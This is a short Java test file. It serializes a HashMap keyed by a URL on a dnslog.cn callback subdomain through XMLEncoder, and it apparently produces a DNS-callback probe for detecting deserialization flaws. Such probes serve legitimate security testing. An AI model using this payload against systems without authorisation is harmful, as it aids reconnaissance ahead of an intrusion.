import java.beans.XMLEncoder;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class XMLEncoderTest {
    public static void main(String[] args) throws MalformedURLException {
        HashMap<Object,Object> ok = new HashMap<Object, Object>();
        ok.put(new URL("http://mmm.aw3kwd.dnslog.cn"),"x");
        XMLEncoder xmlEncoder = new XMLEncoder(System.out);
        xmlEncoder.writeObject(ok);
        xmlEncoder.close();
    }
}
